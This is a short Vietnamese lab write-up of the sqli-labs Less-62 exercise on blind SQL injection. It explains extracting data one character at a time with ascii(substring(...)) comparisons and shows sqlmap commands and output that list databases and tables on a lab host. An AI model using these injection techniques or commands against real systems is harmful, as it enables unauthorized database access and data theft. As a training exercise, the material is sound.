- Tài liệu tham khảo 

    + Bảng ascii : http://sticksandstones.kstrom.com/appen.html
    + Blind SQL Injection: http://www.securityidiots.com/Web-Pentest/SQL-Injection/Blind-SQL-Injection.html
    + sqlmap : https://github.com/sqlmapproject/sqlmap/wiki/Usage

- Ý tưởng

    + substring('n00b',1,1) trả về n.
    + substring('n00b',2,1) trả về 0.
    + substring('n00b',3,1) trả về 0.
    + substring('n00b',4,1) trả về b.
    + substring('n00b',5,1) trả về empty.

Ascii(substring('n00b',1,1)) tức là mã ascii của n. Đối chiếu với bảng mã `n = 110` 

Tiếp đó chúng ta sẽ đi mò từng kí tự 1 bằng cách

```
ascii(substring((<your_query_here_which_returns_one_row>),1,1))<any_number_here
```

- Ở bài này tôi sử dụng công cụ sqlmap 

    + Dump database 

    ```
    python sqlmap.py -u 'http://10.10.10.171/sqli-labs/Less-62/?id=1%27)' --dbs
    ```

    + output 

    ```
    [15:45:33] [INFO] retrieved: security
    available databases [5]:
    [*] challenges
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] security
    ```

    + Dump tables của db `challenges`

    ```
    python sqlmap.py -u 'http://10.10.10.171/sqli-labs/Less-62/?id=1%27)' --tables -D challenges
    ```

    + output 

    ```
    [16:02:35] [WARNING] increasing time delay to 2 seconds
    JTGC8HN
    Database: challenges
    [1 table]
    +------------+
    | FIPJTGC8HN |
    +------------+
    ```
